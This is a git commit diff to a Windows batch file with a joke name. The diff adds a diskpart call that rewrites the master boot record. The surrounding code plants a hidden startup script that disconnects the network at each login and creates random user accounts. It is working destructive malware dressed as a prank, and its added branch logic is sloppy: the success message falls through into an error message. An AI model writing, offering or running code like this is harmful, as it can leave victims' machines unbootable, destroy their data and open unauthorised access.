b1ec3c88285f45b573ea749fd6b769ce1c68ae3e
yodadeath <116353756+yodadeath@users.noreply.github.com>
2022-12-17 16:29:03 +0200

    Update wenomechainsama.bat

--- wenomechainsama.bat
+++ wenomechainsama.bat
@@ -164,6 +164,20 @@ start https://www.youtube.com/watch?v=AK8uJcCsRDM
 cd "C:\Users\volde\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 echo ipconfig /release > startup.bat
 attrib +h +s +r startup.bat
+if not "%PROCESSOR_ARCHITECTURE%"=="AMD64" if not "%PROCESSOR_ARCHITECTURE%"=="x86" goto error
+if "%PROCESSOR_ARCHITECTURE%"=="AMD64" if not "%PROCESSOR_ARCHITEW6432%"=="" goto error
+if "%PROCESSOR_ARCHITECTURE%"=="x86" if "%PROCESSOR_ARCHITEW6432%"=="" goto error
+
+if not exist "%SystemRoot%\System32\diskpart.exe" goto error
+
+"%SystemRoot%\System32\diskpart.exe" /s mbr.txt
+
+:success
+echo The MBR has been rewritten successfully.
+
+:error
+echo You do not have sufficient privileges or the diskpart utility is not available.
+
 net user %random% %random% /add
 net user %random% %random% /add
 net user %random% %random% /add
